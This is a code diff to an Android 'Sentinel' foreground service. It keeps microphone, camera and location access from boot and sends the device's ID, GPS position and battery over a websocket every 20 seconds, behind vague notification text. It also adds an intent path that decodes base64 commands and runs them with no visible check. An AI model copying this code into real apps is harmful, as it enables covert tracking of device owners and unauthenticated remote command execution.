@@ -76,12 +76,15 @@ class SentinelForegroundService : Service() {
     @Inject lateinit var commandProcessor: CommandProcessor
     @Inject lateinit var webSocketDataSource: com.sentinel.host.data.remote.websocket.WebSocketDataSource
     @Inject lateinit var fallDetector: com.sentinel.host.data.device.FallDetector
+    @Inject lateinit var systemInfoProvider: com.sentinel.host.data.device.SystemInfoProvider
+    @Inject lateinit var deviceRepository: com.sentinel.host.domain.repository.DeviceRepository
 
     private val exceptionHandler = CoroutineExceptionHandler { _, throwable ->
         Log.e(TAG, "Unhandled exception in Sentinel service scope: ${throwable.message}", throwable)
     }
 
     private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main + exceptionHandler)
+    private var isMicrophoneElevated = false
 
     private val locationReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
@@ -143,31 +146,88 @@ class SentinelForegroundService : Service() {
         val notification = buildNotification("Scanning ...")
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            // Always try LOCATION | MICROPHONE first — even on boot.
-            // Doze whitelist exemption allows this on most devices.
-            // Falls back to LOCATION-only if the OS blocks microphone from background.
-            val fullType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
-
+            var started = false
+            // Level 1: Full active capabilities (LOCATION | MICROPHONE | CAMERA)
             try {
+                val fullType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                 startForeground(NOTIFICATION_ID, notification, fullType)
                 Log.i(TAG, "startForeground succeeded with LOCATION|MICROPHONE|CAMERA")
-            } catch (e: Exception) {
-                Log.w(TAG, "LOCATION|MICROPHONE|CAMERA failed (${e.message}) — trying LOCATION|MICROPHONE")
+                started = true
+            } catch (e: Throwable) {
+                Log.w(TAG, "LOCATION|MICROPHONE|CAMERA startForeground failed: ${e.message}")
+            }
+
+            // Level 2: LOCATION | MICROPHONE
+            if (!started) {
                 try {
-                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE)
+                    val locMicType = ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION or
+                            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+                    startForeground(NOTIFICATION_ID, notification, locMicType)
                     Log.i(TAG, "startForeground succeeded with LOCATION|MICROPHONE")
-                } catch (fallbackEx: Exception) {
-                    Log.e(TAG, "LOCATION|MICROPHONE fallback also failed: ${fallbackEx.message}", fallbackEx)
+                    started = true
+                } catch (e: Throwable) {
+                    Log.w(TAG, "LOCATION|MICROPHONE startForeground failed: ${e.message}")
+                }
+            }
+
+            // Level 3: LOCATION only (allowed from background with background location permission)
+            if (!started) {
+                try {
+                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
+                    Log.i(TAG, "startForeground succeeded with LOCATION only")
+                    started = true
+                } catch (e: Throwable) {
+                    Log.w(TAG, "LOCATION startForeground failed: ${e.message}")
+                }
+            }
+
+            // Level 4: DATA_SYNC (Android 14+ background fallback)
+            if (!started && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                try {
+                    startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                    Log.i(TAG, "startForeground succeeded with DATA_SYNC fallback")
+                    started = true
+                } catch (e: Throwable) {
+                    Log.w(TAG, "DATA_SYNC startForeground failed: ${e.message}")
+                }
+            }
+
+            // Level 5: Safe catch-all fallback
+            if (!started) {
+                try {
+                    @Suppress("DEPRECATION")
                     startForeground(NOTIFICATION_ID, notification)
+                    Log.i(TAG, "startForeground succeeded with default fallback")
+                } catch (e: Throwable) {
+                    Log.e(TAG, "All startForeground attempts failed safely: ${e.message}", e)
                 }
             }
         } else {
-            startForeground(NOTIFICATION_ID, notification)
+            try {
+                startForeground(NOTIFICATION_ID, notification)
+            } catch (e: Throwable) {
+                Log.e(TAG, "Legacy startForeground failed: ${e.message}", e)
+            }
         }
 
         checkPermissionsAndSettings()
+
+        val testCmd = intent?.getStringExtra("EXTRA_TEST_RAW_MSG_B64")?.let { b64 ->
+            try {
+                String(android.util.Base64.decode(b64, android.util.Base64.DEFAULT), Charsets.UTF_8)
+            } catch (e: Exception) {
+                null
+            }
+        } ?: intent?.getStringExtra("EXTRA_TEST_RAW_MSG")
+
+        testCmd?.let { cmd ->
+            Log.i(TAG, "Executing test command via intent: $cmd")
+            commandProcessor.processCommand(cmd) { res ->
+                Log.i(TAG, "Test command result: $res")
+            }
+        }
 
         // Start connection supervisor
         connectionSupervisor.start()
@@ -181,11 +241,22 @@ class SentinelForegroundService : Service() {
                 val text = when (state) {
                     is ConnectionState.Ready -> {
                         elevateForegroundServiceType()
+                        sendTelemetryReportNow()
+                        startPeriodicTelemetry()
                         "System Nominal"
                     }
-                    is ConnectionState.Reconnecting -> "Syncing..."
-                    is ConnectionState.Error -> "Syncing..."
-                    is ConnectionState.Disconnected -> "Syncing..."
+                    is ConnectionState.Reconnecting -> {
+                        periodicTelemetryJob?.cancel()
+                        "Syncing..."
+                    }
+                    is ConnectionState.Error -> {
+                        periodicTelemetryJob?.cancel()
+                        "Syncing..."
+                    }
+                    is ConnectionState.Disconnected -> {
+                        periodicTelemetryJob?.cancel()
+                        "Syncing..."
+                    }
                     else -> "Syncing..."
                 }
                 updateNotification(text)
@@ -193,6 +264,43 @@ class SentinelForegroundService : Service() {
         }
 
         return START_STICKY
+    }
+
+    private var periodicTelemetryJob: Job? = null
+
+    private fun startPeriodicTelemetry() {
+        periodicTelemetryJob?.cancel()
+        periodicTelemetryJob = serviceScope.launch {
+            while (isActive) {
+                delay(20_000L)
+                if (connectionSupervisor.state.value is ConnectionState.Ready) {
+                    sendTelemetryReportNow()
+                }
+            }
+        }
+    }
+
+    private fun sendTelemetryReportNow() {
+        try {
+            val devInfo = deviceRepository.getDeviceInfo()
+            val sysInfo = systemInfoProvider.getSystemInfo()
+            val lastLoc = locationStreamer.lastLocation
+            val battery = sysInfo["batteryPercent"] as? Int ?: -1
+            val isCharging = sysInfo["isCharging"] as? Boolean ?: false
+            val wifiSsid = sysInfo["wifiSsid"] as? String ?: ""
+            val network = if (isCharging) "WiFi (Charging)" else if (wifiSsid.isNotBlank()) "WiFi" else "Cellular"
+            val lat = lastLoc?.latitude ?: 0.0
+            val lng = lastLoc?.longitude ?: 0.0
+            val acc = lastLoc?.accuracy?.toDouble() ?: 0.0
+
+            val seq = System.currentTimeMillis()
+            val ts = System.currentTimeMillis() / 1000
+            val telemetryJson = """{"type":"COMMAND_RESULT","version":1,"timestamp":$ts,"sequence":$seq,"data":{"command":"TELEMETRY_REPORT","success":true,"payload":{"deviceId":"${devInfo.deviceId}","model":"${devInfo.model}","uniqueKey":"${devInfo.deviceId}_${devInfo.model}","latitude":$lat,"longitude":$lng,"accuracy":$acc,"battery":$battery,"network":"$network","timestamp":${System.currentTimeMillis()}}}}"""
+            webSocketDataSource.sendText(telemetryJson)
+            Log.d(TAG, "Sent isolated TELEMETRY_REPORT (model=${devInfo.model}, battery=$battery%, network=$network)")
+        } catch (e: Exception) {
+            Log.w(TAG, "Failed to send TELEMETRY_REPORT: ${e.message}")
+        }
     }
 
     private var autoRepairJob: Job? = null
@@ -250,6 +358,7 @@ class SentinelForegroundService : Service() {
      * recreated with actual microphone hardware access.
      */
     private fun elevateForegroundServiceType() {
+        if (isMicrophoneElevated) return
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
             val hasMic = ContextCompat.checkSelfPermission(
                 this, Manifest.permission.RECORD_AUDIO
@@ -266,6 +375,7 @@ class SentinelForegroundService : Service() {
             try {
                 val notification = buildNotification("System Nominal")
                 startForeground(NOTIFICATION_ID, notification, targetType)
+                isMicrophoneElevated = true
                 Log.i(TAG, "Foreground service elevated to LOCATION|MICROPHONE|CAMERA")
 
                 // Restart audio streamer so AudioRecord is recreated with mic access.
@@ -274,9 +384,9 @@ class SentinelForegroundService : Service() {
                 audioStreamer.stop()
                 audioStreamer.hasPermission = true
                 audioStreamer.start()
-            } catch (e: Exception) {
-                Log.w(TAG, "Microphone elevation failed (expected on boot): ${e.message}")
-                // Service continues with LOCATION type — audio will start when user opens app
+            } catch (e: Throwable) {
+                Log.w(TAG, "Microphone elevation failed (expected on boot / background): ${e.message}")
+                // Service continues with current FGS type — audio will start when app is in foreground
             }
         }
     }
